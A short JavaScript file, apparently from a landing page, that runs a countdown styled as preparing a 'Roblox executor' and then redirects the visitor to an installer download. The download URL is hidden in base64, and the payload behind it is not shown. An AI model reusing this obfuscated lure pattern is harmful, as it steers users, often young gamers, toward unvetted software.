var encodedUrl = 'aHR0cHM6Ly9uZXctc29mdC5vcmcvZXhlY3V0b3Iv';
var redirectUrl = atob(encodedUrl);

var count = document.querySelector('#count');
var fill = document.querySelector('#fill');
var msg = document.querySelector('#msg');
var skip = document.querySelector('#skip');

var n = 3;
var finished = false;
var words = ['Ready player...', 'Loading scripts...', 'Preparing Roblox executor...', 'Let’s go!'];

function finish() {
    if (finished) return;
    finished = true;
    count.textContent = 'GO!';
    count.classList.add('go');
    fill.style.width = '100%';
    msg.textContent = 'Opening Installer...';
    setTimeout(function() {
        window.location.href = redirectUrl;
    }, 900);
}

function tick() {
    count.textContent = n;
    count.classList.remove('pop');
    void count.offsetWidth;
    count.classList.add('pop');
    fill.style.width = ((3 - n) / 3 * 100) + '%';
    msg.textContent = words[3 - n];
    if (n === 0) {
        finish();
        return;
    }
    n--;
    setTimeout(tick, 1000);
}

setTimeout(tick, 500);
skip.onclick = finish;